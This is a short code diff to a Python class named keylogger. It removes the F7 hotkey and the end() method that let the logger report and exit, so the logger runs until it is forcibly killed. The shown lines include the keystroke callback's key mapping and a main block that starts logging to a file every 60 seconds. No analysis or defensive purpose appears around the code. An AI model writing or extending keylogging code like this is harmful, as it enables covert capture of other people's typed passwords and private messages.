@@ -14,9 +14,7 @@ class keylogger:
     def callback(self,event):
         name=event.name
         if len(name) > 1:
-            if name == "f7":
-                self.end()
-            elif name == "space":
+            if name == "space":
                 name = " "
             elif name =="enter":
                 name = "[ENTER]\n"
@@ -58,9 +56,7 @@ class keylogger:
         self.report()
         keyboard.wait()
 
-    def end(self):
-        self.report()
-        sys.exit()    
+ 
 
 if __name__ == "__main__":
     Keylogger =    keylogger(interval=60,report_method="file")
